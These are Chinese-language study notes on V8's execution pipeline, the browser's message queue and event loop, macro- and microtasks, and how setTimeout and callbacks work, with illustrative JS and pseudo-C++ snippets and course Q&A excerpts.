![image-20220404181023531](.\typora-user-images\image-20220404181023531.png)

V8 在执行过程中既有**解释器 Ignition**，又有**编译器 TurboFan**，那么它们是如何配合去执行一段 JavaScript 代码的呢?

1. **生成抽象语法树（AST）和执行上下文**

将源代码转换为**抽象语法树**，并生成**执行上下文**，而执行上下文主要是代码在执行过程中的环境信息。

**什么是 AST**

高级语言是开发者可以理解的语言，但是让编译器或者解释器来理解就非常困难了。对于编译器或者解释器来说，它们可以理解的就是 AST 了。无论是解释型语言还是编译型语言，在编译过程中，它们都会生成一个 AST。这和渲染引擎将 HTML 格式文件转换为计算机可以理解的 DOM 树的情况类似。

结合下面这段代码来直观地感受下什么是 AST：

```js
var myName = ' 极客时间 ';
function foo() {
  return 23;
}
myName = 'geektime';
foo();
```

这段代码经过[javascript-ast](http://resources.jointjs.com/demos/javascript-ast)站点处理后，生成的 AST 结构如下：

![image-20220404181455698](.\typora-user-images\image-20220404181455698.png)

从图中可以看出，AST 的结构和代码的结构非常相似， AST 是代码的结构化的表示，编译器或者解释器后续的工作都需要依赖于 AST，而不是源代码。

Babel 的工作原理就是先将 ES6 源码转换为 AST，然后再将 ES6 语法的 AST 转换为 ES5 语法的 AST，最后利用 ES5 的 AST 生成 JavaScript 源代码。

ESLint 是一个用来检查 JavaScript 编写规范的插件，其检测流程也是需要将源码转换为 AST，然后再利用 AST 来检查代码规范化的问题。

**AST 是如何生成的**

通常，生成 AST 需要经过两个阶段。

**第一阶段是分词（tokenize），又称为词法分析**，其作用是将一行行的源码拆解成一个个 token。所谓**token**，指的是语法上不可能再分的、最小的单个字符或字符串。

![image-20220404181907592](.\typora-user-images\image-20220404181907592.png)

关键字“var”、标识符“myName” 、赋值运算符“=”、字符串“极客时间”四个都是 token，而且它们代表的属性还不一样。

**第二阶段是解析（parse），又称为语法分析**，其作用是将上一步生成的 token 数据，根据语法规则转为 AST。如果源码符合语法规则，这一步就会顺利完成。但如果源码存在语法错误，这一步就会终止，并抛出一个“语法错误”。

有了 AST 后，那接下来 V8 就会生成该段代码的执行上下文。

**2. 生成字节码**

接下解释器 Ignition 会根据 AST 生成字节码，并解释执行字节码。

之前的 V8 并没有字节码，而是直接将 AST 转换为机器码，由于执行机器码的效率是非常高效的，所以这种方式在发布后的一段时间内运行效果是非常好的。但是随着 Chrome 在手机上的广泛普及，内存占用问题也暴露出来了，因为 V8 需要消耗大量的内存来存放转换后的机器码。为了解决内存占用问题，V8 团队大幅重构了引擎架构，引入字节码，并且抛弃了之前的编译器。

什么是字节码？为什么引入字节码就能解决内存占用问题？

**字节码就是介于 AST 和机器码之间的一种代码。但是与特定类型的机器码无关，字节码需要通过解释器将其转换为机器码后才能执行。**

![image-20220404182331912](.\typora-user-images\image-20220404182331912.png)

从图中可以看出，机器码所占用的空间远远超过了字节码，所以使用字节码可以减少系统的内存使用。

**3. 执行代码**

生成字节码之后，接下来就要执行阶段。

**解释器 Ignition 除了负责生成字节码之外，它还有另外一个作用，就是解释执行字节码。**

通常，如果有一段第一次执行的字节码，解释器 Ignition 会逐条解释执行。在执行字节码的过程中，如果发现有热点代码（HotSpot），比如一段代码被重复执行多次，这种就称为**热点代码**，那么后台的编译器 TurboFan 就会把该段热点的字节码编译为高效的机器码，然后当再次执行这段被优化的代码时，只需要执行编译后的机器码就可以了，这样就大大提升了代码的执行效率。

解释器 Ignition 是点火器的意思，编译器 TurboFan 是涡轮增压的意思，寓意着代码启动时通过点火器慢慢发动，一旦启动，涡轮增压介入，其执行效率随着执行时间越来越高效率，因为热点代码都被编译器 TurboFan 转换了机器码，直接执行机器码就省去了字节码“翻译”为机器码的过程。

字节码配合解释器和编译器，比如 Java 和 Python 的虚拟机也都是基于这种技术实现的，我们把这种技术称为**即时编译（JIT）**。具体到 V8，就是指解释器 Ignition 在解释执行字节码的同时，收集代码信息，当它发现某一部分代码变热了之后，TurboFan 编译器便把热点的字节码转换为机器码，并把转换后的机器码保存起来，以备下次使用。

理解 JIT 工作机制,JIT 的工作过程:

![image-20220404182812109](.\typora-user-images\image-20220404182812109.png)

### JavaScript 的性能优化

对于优化 JavaScript 执行效率，将优化的中心聚焦在单次脚本的执行时间和脚本的网络下载上，主要关注以下三点内容：

1. 提升单次脚本的执行速度，避免 JavaScript 的长任务霸占主线程，这样可以使得页面快速响应交互；
2. 避免大的内联脚本，因为在解析 HTML 的过程中，解析和编译也会占用主线程；
3. 减少 JavaScript 文件的容量，因为更小的文件会提升下载速度，并且占用更低的内存。

问题：你是怎么理解“V8 执行时间越久，执行效率越高”这个性质的？

渲染进程里的 input 标签上传图片，通过与浏览器主进程通信，主进程读取硬盘图片数据返回给渲染进程，渲染进程里的 js 发起 ajax 请求，渲染进程中的的 xmlhttprequest 可以直接走网络进程，由网络进程发起请求，不需要浏览器进程介入。

请求长时间处于 pending 状态或者脚本执行死循环，这时刷新或前进后退页面不响应，刷新或前进后退页面是属于浏览器主进程的 UI 交互行为，为什么渲染进程里的 js 引擎执行会影响到主进程？

> 因为前进或者后退也需要执行当前页面脚本，比如要执行 beforeunload 事件，执行的时候页面没响应了，所以前进后退也就失效了

```js
function fn() {
  var a = 10;
  function f1() {
    console.log(a);
  }
  function f2() {
    console.log('f2');
  }
  f2();
}
fn();
```

我在函数 f2 里打断点，当执行到函数 f2 时，chrome 里显示 Closure:{a:10},如果把这个原因解释为在 fn 函数里会预扫描 f1 函数，那我现在把 fn2 函数和调用都注释了，现在执行 fn 函数时不产生 Closure，为什么就不预扫描 f1 函数了？这是为什么？

> 把 f2 注释了，当执行 fn 函数时，照样会预扫描 f1，照样会产生闭包，只不过当 fn 执行结束之后，闭包的内容没有外部引用，那么下次垃圾回收直接把比闭包的内容回收掉

问题：编译的基本单位是一段 JS 代码（内敛 JS）或者一个 JS 文件吗(还是以当前调用栈将要执行函数为单位）？

> 作者回复: 全局代码，或者函数 ！
>
> 比如下载完一个 js 文件，先编译这个 js 文件,但是 js 文件内定义的函数是不会编译的。
>
> 等调用到该函数的时候，Javascript 引擎才会去编译该函数！

# 消息队列和事件循环

![image-20220504210214274](.\typora-user-images\image-20220504210214274.png)

```js
// 基本的概念  进程和线程之间的关系
// 计算机分配任务是以进程来分配的 ， 进程中包含着线程

// 浏览器是一个进程  而且是一个多进程模型 （多进程的好处就是其中一个进程挂掉了，不会影响其他进程）
// 一个tab就是一个独立的进程
// 浏览器默认要有一个主进程，来调度其他进程  （进程间的通信）
// 网络进程  发送http请求等
// 插件也有独立的进程
// gpu绘图进程
// 一个tab就是一个独立的进程 (渲染进程)

// 渲染进程 (线程)
// ui 渲染线程  负责页面渲染，布局，绘制
// js 引擎线程  执行js代码的

// 互斥的：js可以操作dom ，渲染需要dom  如果正在渲染页面时，渲染到一半了如果js要求把dom删除掉？
// js也是单线程的， 由于如果js是多线程操作dom的会导致 一个线程说我要添加一个节点， 另一个说我要删除节点？

//  js也是单线程的 指代的是主线程 （默认代码从上到下依次执行）
//  定时器， 发请求， 用户事件 （在主线程执行的时候 还会创建一些独立的线程）

// 异步 ： 为异步任务划分优先级
// 宏任务和微任务执行时机不一样
// 宏任务 macro-task： 写的script脚本， ui渲染，定时器(setTimeout)， 发请求， 用户事件，messageChannel, setImmediate(ie下有，比setTimeout性能好)
// 微任务 micro-task： Promise.then(语言本身提供的)， queueMicrotashk  MutationObserver （异步监控dom的变化）

// requestFrameAnimation requestAdleCallback (发生在渲染里的， 就是个回调函数， 这个东西不应该分到宏任务和微任务中)

// js 执行的顺序怎么定义呢？ 先执行完当前同步代码，再去执行异步代码。 有一个单独的线程来扫描异步任务 事件触发线程EventLoop

// 代码执行的过程的时候 会产生微任务和宏任务
// 当发生的宏任务时间到达的时候会被发入到宏任务队列中 (放入是回调) 宏任务只有一个队列
// 微任务是立刻放到队列中 （每次执行宏任务的时候会产生一个微任务队列）

// 当前宏任务执行完毕后，会清空本轮产生的微任务, 如果执行微任务的时候又产生了微任务，会放到当前微任务的尾部
// 看一眼要不要渲染页面？ 要渲染就渲染（requestFrameAnimation requestAdleCallback） 刷新频率 16.6ms

// 再去扫描宏任务队列，如果有则取出第一个宏任务 ， 再去执行

// 每次微任务是执行一批 ， 宏任务是执行一个
```

**每个渲染进程都有一个主线程**（基本是每个 Tab 页面都有自己的渲染进程，该进程中有一个主线程），主线程中会执行多种不同的任务，且同一时刻只能处理一项任务：

- 处理 DOM 解析
- 计算样式
- 处理布局
- 处理 JavaScript 任务
- 各种输入事件

要让这么多不同类型的任务在主线程中有序地执行，这就需要一个系统来统筹调度这些任务，这个统筹调度系统就是**消息队列和事件循环系统**。

### 页面的事件循环系统

它能让你理解页面到底是如何运行的。理解浏览器渲染进程中的主线程是如何工作的。

#### 使用单线程处理安排好的任务

比如有如下一系列的任务：

- 任务 1：1+2
- 任务 2：20/5
- 任务 3：7\*8
- 任务 4：打印出任务 1、任务 2、任务 3 的运算结果

现在在**一个线程**中去执行这些任务，通常会这样编写代码：

```c++
void MainThread(){
    int num1 = 1+2; // 任务 1
    int num2 = 20/5; // 任务 2
    int num3 = 7*8; // 任务 3
    print(" 最终计算的值为:%d,%d,%d",num,num2,num3)； // 任务 4
}
```

在上面的执行代码中，把**所有任务代码**按照顺序写进主线程里，等线程执行时，这些任务会按照顺序在线程中依次被执行；等所有任务执行完成之后，**线程会自动退出**。

![image-20220404185646021](.\typora-user-images\image-20220404185646021.png)

#### 在线程运行过程中处理新任务

并不是所有的任务都是在执行之前统一安排好的，**大部分情况下，新的任务是在线程运行过程中产生的。**

**要想在线程运行过程中，能接收并执行新的任务，就需要采用事件循环机制**。通过一个 for 循环语句来监听是否有新的任务，如下面的示例代码：

```c++
//GetInput
// 等待用户从键盘输入一个数字，并返回该输入的数字
int GetInput(){
    int input_number = 0;
    cout<<" 请输入一个数:";
    cin>>input_number;
    return input_number;
}

// 主线程 (Main Thread)
void MainThread(){
     for(;;){
          int first_num = GetInput()；
          int second_num = GetInput()；
          result_num = first_num + second_num;
          print(" 最终计算的值为:%d",result_num)；
      }
}
```

这一版的线程做了两点改进：

- **引入事件循环机制**，在线程语句最后添加了一个**for 循环语句**，**线程**会一直循环执行。
- **引入事件**，可以在线程运行过程中，等待用户输入的数字，**等待过程中线程处于暂停状态**，一旦接收到用户输入的信息，那么线程会被激活，然后执行相加运算，最后输出结果。

![image-20220404190131433](.\typora-user-images\image-20220404190131433.png)

#### 处理其他线程发送过来的任务

在第二版的线程模型中，**所有的任务都是来自于线程内部的**，如果另外一个线程想让主线程执行一个任务，利用第二版的线程模型是无法做到的。

其他线程是如何发送消息给渲染主线程的，具体形式可以参考下图：

![image-20220404221625855](.\typora-user-images\image-20220404221625855.png)

**渲染主线程**会频繁接收到来自于 **IO 线程**的一些任务，接收到这些任务之后，渲染进程主线程就需要着手处理，比如接收到资源加载完成的消息后，渲染进程的主线程就要着手进行 DOM 解析了；接收到鼠标点击的消息后，渲染主线程就要开始执行相应的 JavaScript 脚本来处理该点击事件。

那么如何设计好一个线程模型，让其能够接收其他线程发送的消息呢？

一个通用模式是使用**消息队列**。

![image-20220404221716835](.\typora-user-images\image-20220404221716835.png)

![image-20220404221800029](.\typora-user-images\image-20220404221800029.png)

**第三版的线程模型**

1. 构造一个消息队列（下面是接口，不是实现）

   ```c++
   class TaskQueue{
     public:
     Task takeTask(); // 取出队列头部的一个任务
     void pushTask(Task task); // 添加一个任务到队列尾部
   };
   ```

2. 改造主线程，让主线程从队列中读取任务

   ```
   TaskQueue task_queue；
   void ProcessTask();
   void MainThread(){
     for(;;){
       Task task = task_queue.takeTask();
       ProcessTask(task);
     }
   }
   ```

   在上面的代码中，添加了一个消息队列的对象，然后在主线程的 for 循环代码块中，从消息队列中读取一个任务，然后执行该任务，主线程就这样一直循环往下执行，因此只要消息队列中有任务，主线程就会去执行。

   主线程执行的任务都**全部**从消息队列中获取。所以如果有其他线程想要发送任务让主线程去执行，只需要将任务添加到该消息队列中就可以了，添加任务的代码如下：

```c++
Task clickTask;
task_queue.pushTask(clickTask)
```

由于是多个线程操作同一个消息队列，所以在添加任务和取出任务时还会加上一个同步锁。

**处理其他进程发送过来的任务**

通过使用消息队列，我们实现了**线程之间的消息通信**。在 Chrome 中，**跨进程之间的任务**也是频繁发生的，那么如何处理其他进程发送过来的任务？

![image-20220404222309192](.\typora-user-images\image-20220404222309192.png)

从图中可以看出，**渲染进程专门有一个 IO 线程用来接收其他进程传进来的消息**，接收到消息之后，会将这些消息组装成任务添加到消息队列中，后续的步骤就和前面讲解的“处理其他线程发送的任务”一样。

#### 消息队列中的任务类型

消息队列中的任务类型可以参考下[Chromium 的官方源码](https://cs.chromium.org/chromium/src/third_party/blink/public/platform/task_type.h)，这里面包含了很多内部消息类型，如输入事件（鼠标滚动、点击、移动）、微任务、文件读写、WebSocket、JavaScript 定时器等等。

除此之外，消息队列中还包含了很多与页面相关的事件，如 **JavaScript 执行、解析 DOM、样式计算、布局计算、CSS 动画**（不是全部的 css 动画都需要占用主线程）等。

以上这些事件都是在主线程中执行的，所以在编写 Web 应用时，你还需要衡量这些事件所占用的时长，并想办法解决单个任务占用主线程过久的问题。

#### 安全退出

当页面主线程执行完成之后，又该如何保证页面主线程能够安全退出呢？Chrome 是这样解决的，确定要退出当前页面时，页面主线程会设置一个退出标志的变量，在**每次执行完一个任务**时，判断是否有设置退出标志。

如果设置了，那么就直接中断当前的所有任务，退出线程，你可以参考下面代码：

```c++
TaskQueue task_queue；
void ProcessTask();
bool keep_running = true;
void MainThread(){
  for(;;){
    Task task = task_queue.takeTask();
    ProcessTask(task);
    if(!keep_running) // 如果设置了退出标志，那么直接退出线程循环
        break;
  }
}
```

#### 页面使用单线程的缺点

页面线程所有执行的任务都来自于消息队列。消息队列是“先进先出”的属性，也就是说放入队列中的任务，需要等待前面的任务被执行完，才会被执行。鉴于这个属性，就有如下两个问题需要解决。

**第一个问题是如何处理高优先级的任务。**

比如一个典型的场景是监控 DOM 节点的变化情况（节点的插入、修改、删除等动态变化），然后根据这些变化来处理相应的业务逻辑。一个通用的设计的是，利用 JavaScript 设计一套监听接口，当变化发生时，渲染引擎同步调用这些接口，这是一个典型的观察者模式。

不过这个模式有个问题，因为 DOM 变化非常频繁，如果每次发生变化的时候，都直接调用相应的 JavaScript 接口，那么这个当前的任务执行时间会被拉长，从而导致**执行效率的下降**。

如果将这些 DOM 变化做成异步的消息事件，添加到消息队列的尾部，那么又会影响到监控的**实时性**，因为在添加到消息队列的过程中，可能前面就有很多任务在排队了。

这也就是说，如果 DOM 发生变化，采用同步通知的方式，会影响当前任务的**执行效率**；如果采用异步方式，又会影响到**监控的实时性**。

那该如何权衡**效率**和**实时性**呢？

针对这种情况，微任务就应用而生了，微任务是如何权衡效率和实时性的。

通常我们把消息队列中的一个个的任务称为**宏任务**，每个宏任务中都包含了一个**微任务队列**，在执行宏任务的过程中，如果 DOM 有变化，那么就会将该变化添加到微任务列表中，这样就不会影响到宏任务的继续执行，因此也就解决了执行效率的问题。

等宏任务中的主要功能都执行完成之后，这时候，渲染引擎并不着急去执行下一个宏任务，而是执行当前宏任务中的微任务，因为 DOM 变化的事件都保存在这些微任务队列中，这样也就解决了实时性问题。

**第二个是如何解决单个任务执行时长过久的问题。**

因为所有的任务都是在单线程中执行的，所以每次只能执行一个任务，而其他任务就都处于等待状态。如果其中一个任务执行时间过久，那么下一个任务就要等待很长时间。可以参考下图：

![image-20220404223037051](.\typora-user-images\image-20220404223037051.png)

从图中你可以看到，如果在执行动画过程中，其中有个 JavaScript 任务因执行时间过久，占用了动画单帧的时间，这样会给用户制造了卡顿的感觉，这当然是极不好的用户体验。针对这种情况，JavaScript 可以通过回调功能来规避这种问题，也就是让要执行的 JavaScript 任务滞后执行。

### 实践：浏览器页面是如何运行的

打开开发者工具，点击“Performance”标签，选择左上角的“start porfiling and load page”来记录整个页面加载过程中的事件执行情况，如下图所示：

![image-20220415131148402](.\typora-user-images\image-20220415131148402.png)

从图中可以看出，我们点击展开了 Main 这个项目，其记录了**主线程**执行过程中的所有任务。图中灰色的就是一个个任务，每个任务下面还有子任务，其中的 Parse HTML 任务，是把 HTML 解析为 DOM 的任务。值得注意的是，在执行 Parse HTML 的时候，如果遇到 JavaScript 脚本，那么会暂停当前的 HTML 解析而去执行 JavaScript 脚本。

问题：结合消息队列和事件循环，你认为微任务是什么？引入微任务能带来什么优势呢？

**每个宏任务都有一个微任务列表，在宏任务的执行过程中产生微任务会被添加到改列表中，等宏任务快执行结束之后，会执行微认为列表，所以微任务依然运行在当前宏任务的执行环境中，这个特性会导致宏任务和微任务有一些本质上的区别！**

**宿主发起的任务是宏任务 如点击事件，settimeout 进消息队列；js 引擎发起的任务是微任务如 promise。**

**宏任务是开会分配的工作内容，微任务是工作过程中被临时安排的内容。**

问：用 CSS3 实现动画是不是不会影响主线程，和用 JS 实现动画会影响主线程？

答：部分 css3 的动画效果是在合成线程上实现的，不需要主线程介入，所以省去了重拍和重绘的过程，这就大大提升了渲染效率。 JavaScript 都是在在主线程上执行的，所以 JavaScript 的动画需要主线程的参与，所以效率会大打折扣！

问：为什么说页面是单线程架构？ 默认情况下每个标签页都会配套一个渲染进程，而一个渲染进程里不是有主线程、合成线程、IO 线程等多个线程吗？ 是因为【排版引擎 blink】 和【JavaScript 引擎 v8】都工作在渲染进程的主线程上并且是互斥的，基于这点说页面是单线程架构？

答：是的，他们都是在渲染进程的主线程上工作，所以同时只能执行一个。 比如 v8 除了在主线程上执行 JavaScript 代码之外，还会在主线程上执行垃圾回收，所以执行垃圾回收时停止主线程上的所有任务，我们把垃圾回收这个特性叫着全停顿。 因为 JavaScript 引擎是运行在渲染进程的主线程上的，所以我们说 JavaScript 是单线程执行的！

事件循环的本质是 for 循环，循环不会一直迭代导致主线程卡主吗？

不会，实际过程中采用系统级中断机制，也就是有事件时，线程才会被激活，没事件时，线程就会被挂起。

每一个宏任务都有一个微任务队列？还是整个任务队列有一个微任务队列？

每个宏任务都有微任务队列。

## WebAPI

通过**setTimeout**和**XMLHttpRequest**这两个 WebAPI 来介绍事件循环的应用 。

**setTimeout**

是一个**定时器，用来指定某个函数在多少毫秒之后执行**。它会返回一个整数，表示定时器的编号，同时你还可以通过该编号来取消这个定时器。

```js
function showName() {
  console.log(' 极客时间 ');
}
var timerID = setTimeout(showName, 200);
```

#### 浏览器是如何实现定时器

渲染进程中所有运行在主线程上的任务都需要先添加到消息队列，然后事件循环系统再按照顺序执行消息队列中的任务。那些典型的事件：

- 当接收到 HTML 文档数据，渲染引擎就会将“解析 DOM”事件添加到消息队列中，
- 当用户改变了 Web 页面的窗口大小，渲染引擎就会将“重新布局”的事件添加到消息队列中。
- 当触发了 JavaScript 引擎垃圾回收机制，渲染引擎会将“垃圾回收”任务添加到消息队列中。
- 要执行一段**异步** JavaScript 代码，也是需要将执行任务添加到消息队列中。

以上列举的只是一小部分事件，这些事件被添加到消息队列之后，事件循环系统就会按照消息队列中的顺序来执行事件。

要执行一段异步任务，需要先将任务添加到消息队列中。不过**通过定时器设置回调函数有点特别，它们需要在指定的时间间隔内被调用，但消息队列中的任务是按照顺序执行的，所以为了保证回调函数能在指定时间内执行，你不能将定时器的回调函数直接添加到消息队列中。**

在 Chrome 中除了正常使用的消息队列之外，**还有另外一个消息队列**，**这个队列中维护了需要延迟执行的任务列表**，包括了定时器和 Chromium 内部一些需要延迟执行的任务。所以当通过 JavaScript 创建一个定时器时，会将定时器交给定时器线程进行时间的计算和管理，一旦时间达到条件，该线程会将会将该定时器的回调任务添加到**延迟队列**中。

参考[Chromium 中关于队列部分的源码](https://cs.chromium.org/chromium/src/base/task/sequence_manager/task_queue_impl.h)。

源码中延迟执行队列的定义如下所示：

```c++
 DelayedIncomingQueue delayed_incoming_queue;
```

当通过 JavaScript 调用 setTimeout 设置回调函数的时候，渲染进程将会创建一个回调任务，包含了回调函数 showName、当前发起时间、延迟执行时间，其模拟代码如下所示：

```c++
struct DelayTask{
  int64 id；
  CallBackFunction cbf;
  int start_time;
  int delay_time;
};
DelayTask timerTask;
timerTask.cbf = showName;
timerTask.start_time = getCurrentTime(); // 获取当前时间
timerTask.delay_time = 200;// 设置延迟执行时间
```

创建好回调任务之后，再将该任务添加到延迟执行队列中，代码如下所示：

```c++
delayed_incoming_queue.push(timerTask)；
```

现在通过定时器发起的任务就被保存到延迟队列中了，那接下来我们再来看看消息循环系统是怎么触发延迟队列的。

我们可以来完善[上一篇文章](https://time.geekbang.org/column/article/132931)中消息循环的代码，在其中加入执行延迟队列的代码，如下所示：

```c++
void ProcessTimerTask(){
  // 从 delayed_incoming_queue 中取出已经到期的定时器任务
  // 依次执行这些任务
}

TaskQueue task_queue；
void ProcessTask();
bool keep_running = true;
void MainTherad(){
  for(;;){
    // 执行消息队列中的任务
    Task task = task_queue.takeTask();
    ProcessTask(task);

    // 执行延迟队列中的任务
    ProcessDelayTask()

    if(!keep_running) // 如果设置了退出标志，那么直接退出线程循环
        break;
  }
}
```

从上面代码可以看出来，我们添加了一个**ProcessDelayTask 函数**，该函数是专门用来处理延迟执行任务的。重点关注它的执行时机，在上段代码中，处理完消息队列中的**一个任务**之后，就开始执行 ProcessDelayTask 函数。ProcessDelayTask 函数会根据发起时间和延迟时间计算出到期的任务，然后**依次执行这些到期的任务**。等到期的任务执行完成之后，再继续下一个循环过程。通过这样的方式，一个完整的定时器就实现了。

设置一个定时器，JavaScript 引擎会返回一个定时器的 ID。那通常情况下，当一个定时器的任务还没有被执行的时候，也是可以取消的，具体方法是调用**clearTimeout 函数**，并传入需要取消的定时器的 ID。如下面代码所示：

```js
clearTimeout(timer_id);
```

其实浏览器内部实现取消定时器的操作也是非常简单的，就是直接从 delayed_incoming_queue 延迟队列中，通过 ID 查找到对应的任务，然后再将其从队列中删除掉就可以了。

#### 使用 setTimeout 的一些注意事项

**1. 如果当前任务执行时间过久，会影延迟到期定时器任务的执行**

在使用 setTimeout 的时候，有很多因素会导致回调函数执行比设定的预期值要久，其中一个就是当前任务执行时间过久从而导致定时器设置的任务被延后执行。我们先看下面这段代码：

```js
function bar() {
  console.log('bar');
}
function foo() {
  setTimeout(bar, 0);
  for (let i = 0; i < 5000; i++) {
    let i = 5 + 8 + 8 + 8;
    console.log(i);
  }
}
foo();
```

这段代码中，在执行 foo 函数的时候使用 setTimeout 设置了一个 0 延时的回调任务，设置好回调任务后，foo 函数会继续执行 5000 次 for 循环。

通过 setTimeout 设置的回调任务被放入了消息队列中并且等待下一次执行，这里并不是立即执行的；要执行消息队列中的下个任务，需要等待当前的任务执行完成，由于当前这段代码要执行 5000 次的 for 循环，所以当前这个任务的执行时间会比较久一点。这势必会影响到下个任务的执行时间。

你也可以打开 Performance 来看看其执行过程，如下图所示：

![image-20220404232802133](.\typora-user-images\image-20220404232802133.png)

从图中可以看到，执行 foo 函数所消耗的时长是 500 毫秒，这也就意味着通过 setTimeout 设置的任务会被推迟到 500 毫秒以后再去执行，而设置 setTimeout 的回调延迟时间是 0。

**2. 如果 setTimeout 存在嵌套调用，那么系统会设置最短时间间隔为 4 毫秒**

```js
function cb() {
  setTimeout(cb, 0);
}
setTimeout(cb, 0);
```

上述这段代码你有没有看出存在什么问题？

你还是可以通过 Performance 来记录下这段代码的执行过程，如下图所示：

![image-20220404233048128](.\typora-user-images\image-20220404233048128.png)

上图中的竖线就是定时器的函数回调过程，从图中可以看出，前面五次调用的时间间隔比较小，嵌套调用超过五次以上，后面每次的调用最小时间间隔是 4 毫秒。之所以出现这样的情况，是因为在 Chrome 中，定时器被嵌套调用 5 次以上，系统会判断该函数方法被阻塞了，如果定时器的调用时间间隔小于 4 毫秒，那么浏览器会将每次调用的时间间隔设置为 4 毫秒。下面是[Chromium 实现 4 毫秒延迟的代码](https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/frame/dom_timer.cc)，你可以看下：

```c++
static const int kMaxTimerNestingLevel = 5;

// Chromium uses a minimum timer interval of 4ms. We'd like to go
// lower; however, there are poorly coded websites out there which do
// create CPU-spinning loops.  Using 4ms prevents the CPU from
// spinning too busily and provides a balance between CPU spinning and
// the smallest possible interval timer.
static constexpr base::TimeDelta kMinimumInterval = base::TimeDelta::FromMilliseconds(4);
```

```c++
base::TimeDelta interval_milliseconds =
      std::max(base::TimeDelta::FromMilliseconds(1), interval);

  if (interval_milliseconds < kMinimumInterval &&
      nesting_level_ >= kMaxTimerNestingLevel)
    interval_milliseconds = kMinimumInterval;

  if (single_shot)
    StartOneShot(interval_milliseconds, FROM_HERE);
  else
    StartRepeating(interval_milliseconds, FROM_HERE);
```

所以，一些实时性较高的需求就不太适合使用 setTimeout 了，比如你用 setTimeout 来实现 JavaScript 动画就不是一个很好的主意。

**3. 未激活的页面，setTimeout 执行最小间隔是 1000 毫秒**

如果标签不是当前的激活标签，那么定时器最小的时间间隔是 1000 毫秒，目的是为了优化后台页面的加载损耗以及降低耗电量。

**4. 延时执行时间有最大值**

除了要了解定时器的回调函数时间比实际设定值要延后之外，还有一点需要注意下，那就是 Chrome、Safari、Firefox 都是以 32 个 bit 来存储延时值的，32bit 最大只能存放的数字是 2147483647 毫秒，这就意味着，如果 setTimeout 设置的延迟值大于 2147483647 毫秒（大约 24.8 天）时就会溢出，那么相当于延时值被设置为 0 了，这导致定时器会被立即执行。你可以运行下面这段代码：

```
function showName(){
  console.log(" 极客时间 ")
}
var timerID = setTimeout(showName,2147483648);// 会被理解调用执行
```

运行后可以看到，这段代码是立即被执行的。但如果将延时值修改为小于 2147483647 毫秒的某个值，那么执行时就没有问题了。

**5. 使用 setTimeout 设置的回调函数中的 this 不符合直觉**

如果被 setTimeout 推迟执行的回调函数是某个对象的方法，那么该方法中的 this 关键字将指向全局环境，而不是定义时所在的那个对象。这点在前面介绍 this 的时候也提过，你可以看下面这段代码的执行结果：

```js
var name = 1;
var MyObj = {
  name: 2,
  showName: function () {
    console.log(this.name);
  }
};
setTimeout(MyObj.showName, 1000);
```

这里输出的是 1，因为这段代码在编译的时候，执行上下文中的 this 会被设置为全局 window，如果是严格模式，会被设置为 undefined。

那么该怎么解决这个问题呢？通常可以使用下面这两种方法。

第一种是将`MyObj.showName`放在匿名函数中执行，如下所示：

```js
// 箭头函数
setTimeout(() => {
  MyObj.showName();
}, 1000);
// 或者 function 函数
setTimeout(function () {
  MyObj.showName();
}, 1000);
```

第二种是使用 bind 方法，将 showName 绑定在 MyObj 上面，代码如下所示：

```js
setTimeout(MyObj.showName.bind(MyObj), 1000);
```

对于一些时间精度要求比较高的需求，应该有针对性地采取一些其他的方案。

由于使用 setTimeout 设置的回调任务实时性并不是太好，所以很多场景并不适合使用 setTimeout。比如你要使用 JavaScript 来实现动画效果，函数 requestAnimationFrame 就是个很好的选择。

问题：你需要网上搜索了解下 requestAnimationFrame 的工作机制，并对比 setTimeout，然后分析出 requestAnimationFrame 实现的动画效果比 setTimeout 好的原因。

requestAnimationFrame 提供一个原生的 API 去执行动画的效果，它会在一帧（一般是 16ms）间隔内根据选择浏览器情况去执行相关动作。 setTimeout 是在特定的时间间隔去执行任务，不到时间间隔不会去执行，这样浏览器就没有办法去自动优化。

使用 requestAnimationFrame 不需要设置具体的时间，由系统来决定回调函数的执行时间，requestAnimationFrame 里面的回调函数是在页面刷新之前执行，它跟着屏幕的刷新频率走，保证每个刷新间隔只执行一次，内如果页面未激活的话，requestAnimationFrame 也会停止渲染，这样既可以保证页面的流畅性，又能节省主线程执行函数的开销。

问题：我没有太理解这个异步延迟队列，既然是队列，但好像完全不符合先进先出的特点。在每次执行完任务队列中的一个任务之后都会去执行那些已经到期的延迟任务，这些延迟的任务具体是如何取出的呢。

> 作者回复: 我文章说是队列，为了和消息队列统一起来，不然表述起来有点拗口。
>
> 其实是一个 hashmap 结构，等到执行这个结构的时候，会计算 hashmap 中的每个任务是否到期了，到期了就去执行，直到所有到期的任务都执行结束，才会进入下一轮循环！

#### XMLHttpRequest

**同步回调**和**异步回调**

什么是回调函数？将一个函数作为参数传递给另外一个函数，那作为参数的这个函数就是**回调函数**。

```js
let callback = function () {
  console.log('i am do homework');
};
function doWork(cb) {
  console.log('start do work');
  cb();
  console.log('end do work');
}
doWork(callback);
```

在上面示例代码中，我们将一个匿名函数赋值给变量 callback，同时将 callback 作为参数传递给了 doWork() 函数，这时在函数 doWork() 中 callback 就是回调函数。

上面的回调方法有个特点，就是回调函数 callback 是在主函数 doWork 返回之前执行的，我们把这个回调过程称为**同步回调**。

```js
let callback = function () {
  console.log('i am do homework');
};
function doWork(cb) {
  console.log('start do work');
  setTimeout(cb, 1000);
  console.log('end do work');
}
doWork(callback);
```

在这个例子中，我们使用了 setTimeout 函数让 callback 在 doWork 函数执行结束后，又延时了 1 秒再执行，这次 callback 并没有在主函数 doWork 内部被调用，我们把这种回调函数在主函数外部执行的过程称为**异步回调**。

从事件循环的角度，看看同步回调和异步回调的区别。

当循环系统在执行一个任务的时候，都要为这个任务维护一个**系统调用栈**。这个**系统调用栈**类似于 JavaScript 的调用栈，只不过系统调用栈是 Chromium 的开发语言 C++ 来维护的，其完整的调用栈信息你可以通过 chrome://tracing/ 来抓取。当然，你也可以通过 Performance 来抓取它核心的调用信息，如下图所示：

![image-20220405111625724](.\typora-user-images\image-20220405111625724.png)

这幅图记录了一个 Parse HTML 的任务执行过程，其中黄色的条目表示执行 JavaScript 的过程，其他颜色的条目表示浏览器内部系统的执行过程。

通过该图你可以看出来，Parse HTML 任务在执行过程中会遇到一系列的子过程，比如在解析页面的过程中遇到了 JavaScript 脚本，那么就暂停解析过程去执行该脚本，等执行完成之后，再恢复解析过程。然后又遇到了样式表，这时候又开始解析样式表……直到整个任务执行完成。

需要说明的是，整个 Parse HTML 是一个完整的任务，在执行过程中的脚本解析、样式表解析都是该任务的子过程，其下拉的长条就是执行过程中调用栈的信息。

